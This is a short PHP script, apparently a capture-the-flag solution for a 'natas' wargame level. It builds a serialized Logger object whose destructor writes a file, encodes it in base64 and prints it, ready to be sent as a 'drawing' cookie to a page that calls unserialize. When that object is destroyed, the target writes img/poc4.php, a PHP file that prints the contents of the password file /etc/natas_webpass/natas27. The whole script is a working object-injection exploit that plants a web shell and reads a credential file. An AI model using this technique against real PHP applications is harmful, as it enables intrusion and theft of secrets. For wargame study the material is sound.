<?php

class Logger {
	private $logFile, $initMsg, $exitMsg;

	function __construct($file_name, $file_message) {
		$this->logFile = $file_name;
		$this->exitMsg = $file_message;
	}

	function __destruct(){
		$fd = fopen($this->logFile, "a+");
		fwrite($fd, $this->exitMsg);
		fclose($fd);
	}
}
function test() {
	if (array_key_exists("drawing", $_COOKIE)) {
		$drawing = unserialize(base_64_decode($_COOKIE["drawing"]));
	}
}

session_start();
//$shit = new Logger("img/poc3.php", "<?php file_ge");
$shit = new Logger("img/poc4.php", "<?php echo(file_get_contents('/etc/natas_webpass/natas27')); ?>");
//unset($shit);


echo base64_encode(serialize($shit));
?>
